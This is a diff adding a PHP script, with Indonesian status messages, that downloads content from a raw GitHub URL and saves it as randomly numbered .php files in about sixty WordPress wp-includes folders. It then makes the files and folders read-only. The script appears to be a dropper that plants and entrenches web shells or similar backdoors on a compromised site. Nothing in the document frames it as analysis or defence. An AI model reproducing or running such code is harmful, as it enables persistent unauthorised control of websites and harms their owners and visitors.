@@ -1,0 +1,119 @@
+<?php
+
+function download_and_save_to_multiple_dirs(array $files, array $save_dirs) {
+    $options = [
+        'http' => [
+            'header' => "User-Agent: Mozilla/5.0\r\n"
+        ]
+    ];
+    $context = stream_context_create($options);
+
+    foreach ($save_dirs as $dir) {
+        if (!is_dir($dir)) {
+            echo "Folder '$dir' belum ada. Mencoba membuat...\n";
+            if (!mkdir($dir, 0777, true)) {
+                echo "❌ Gagal membuat folder: $dir\n";
+                continue;
+            }
+            echo "✅ Folder '$dir' berhasil dibuat.\n";
+        } else {
+            echo "📁 Folder '$dir' sudah ada.\n";
+        }
+    }
+
+    foreach ($files as $file) {
+        $url = $file['url'];
+        echo "⬇️  Downloading: $url\n";
+        $content = @file_get_contents($url, false, $context);
+        if ($content === false) {
+            echo "❌ Gagal download dari $url\n";
+            continue;
+        }
+
+        foreach ($save_dirs as $dir) {
+            $random_number = rand(100000, 999999);
+            $save_path = rtrim($dir, '/') . '/' . $random_number . '.php';
+            if (file_put_contents($save_path, $content) !== false) {
+                echo "✅ File disimpan ke: $save_path\n";
+                chmod($save_path, 0444);
+            } else {
+                echo "❌ Gagal simpan file ke: $save_path\n";
+            }
+        }
+    }
+
+    foreach ($save_dirs as $dir) {
+        chmod($dir, 0555);
+        echo "🔧 Permission folder '$dir' di-set ke 0555\n";
+    }
+}
+
+$files_to_download = [
+    ['url' => 'https://raw.githubusercontent.com/erosjoko5/profil2/refs/heads/main/pastygelek', 'save_name' => '32165465.php'],
+];
+
+$save_directories = [
+'/var/www/html/hosza/wp-includes/blocks/archives/',
+'/var/www/html/hosza/wp-includes/blocks/audio/',
+'/var/www/html/hosza/wp-includes/blocks/avatar/',
+'/var/www/html/hosza/wp-includes/blocks/button/',
+'/var/www/html/hosza/wp-includes/blocks/calendar/',
+'/var/www/html/hosza/wp-includes/blocks/categories/',
+'/var/www/html/hosza/wp-includes/blocks/code/',
+'/var/www/html/hosza/wp-includes/blocks/columns/',
+'/var/www/html/hosza/wp-includes/blocks/cover/',
+'/var/www/html/hosza/wp-includes/blocks/embed/',
+'/var/www/html/hosza/wp-includes/blocks/file/',
+'/var/www/html/hosza/wp-includes/blocks/gallery/',
+'/var/www/html/hosza/wp-includes/blocks/group/',
+'/var/www/html/hosza/wp-includes/blocks/heading/',
+'/var/www/html/hosza/wp-includes/blocks/html/',
+'/var/www/html/hosza/wp-includes/blocks/image/',
+'/var/www/html/hosza/wp-includes/blocks/latest-comments/',
+'/var/www/html/hosza/wp-includes/blocks/latest-posts/',
+'/var/www/html/hosza/wp-includes/blocks/list/',
+'/var/www/html/hosza/wp-includes/blocks/media-text/',
+'/var/www/html/hosza/wp-includes/blocks/navigation/',
+'/var/www/html/hosza/wp-includes/blocks/paragraph/',
+'/var/www/html/hosza/wp-includes/blocks/preformatted/',
+'/var/www/html/hosza/wp-includes/blocks/pullquote/',
+'/var/www/html/hosza/wp-includes/blocks/quote/',
+'/var/www/html/hosza/wp-includes/blocks/rss/',
+'/var/www/html/hosza/wp-includes/blocks/search/',
+'/var/www/html/hosza/wp-includes/blocks/separator/',
+'/var/www/html/hosza/wp-includes/blocks/site-logo/',
+'/var/www/html/hosza/wp-includes/blocks/site-title/',
+'/var/www/html/hosza/wp-includes/blocks/social-links/',
+'/var/www/html/hosza/wp-includes/blocks/spacer/',
+'/var/www/html/hosza/wp-includes/blocks/table/',
+'/var/www/html/hosza/wp-includes/blocks/tag-cloud/',
+'/var/www/html/hosza/wp-includes/blocks/text-columns/',
+'/var/www/html/hosza/wp-includes/blocks/verse/',
+'/var/www/html/hosza/wp-includes/blocks/video/',
+'/var/www/html/hosza/wp-includes/cache/',
+'/var/www/html/hosza/wp-includes/certificates/',
+'/var/www/html/hosza/wp-includes/compat/',
+'/var/www/html/hosza/wp-includes/customize/',
+'/var/www/html/hosza/wp-includes/fonts/',
+'/var/www/html/hosza/wp-includes/http/',
+'/var/www/html/hosza/wp-includes/js/',
+'/var/www/html/hosza/wp-includes/js/tinymce/',
+'/var/www/html/hosza/wp-includes/js/tinymce/langs/',
+'/var/www/html/hosza/wp-includes/js/tinymce/plugins/',
+'/var/www/html/hosza/wp-includes/pomo/',
+'/var/www/html/hosza/wp-includes/random_compat/',
+'/var/www/html/hosza/wp-includes/random_compat/lib/',
+'/var/www/html/hosza/wp-includes/Requests/',
+'/var/www/html/hosza/wp-includes/Requests/Cookie/',
+'/var/www/html/hosza/wp-includes/Requests/Exception/',
+'/var/www/html/hosza/wp-includes/Requests/Transport/',
+'/var/www/html/hosza/wp-includes/SimplePie/',
+'/var/www/html/hosza/wp-includes/SimplePie/Cache/',
+'/var/www/html/hosza/wp-includes/SimplePie/Parser/',
+'/var/www/html/hosza/wp-includes/sodium_compat/',
+'/var/www/html/hosza/wp-includes/sodium_compat/lib/',
+'/var/www/html/hosza/wp-includes/theme-compat/',
+'/var/www/html/hosza/wp-includes/widgets/'
+];
+
+download_and_save_to_multiple_dirs($files_to_download, $save_directories);
